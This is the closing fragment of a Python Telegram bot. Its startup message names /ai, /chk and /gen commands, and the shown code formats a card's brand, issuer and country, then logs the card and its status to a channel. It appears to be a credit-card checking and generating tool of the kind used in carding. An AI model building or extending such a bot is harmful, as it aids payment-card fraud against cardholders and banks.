        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝗻𝗱𝘀"
    )

    await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
    
    # Log to channel
    await log_to_channel(client, "CC", message, card, status)

if __name__ == "__main__":
    print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

 
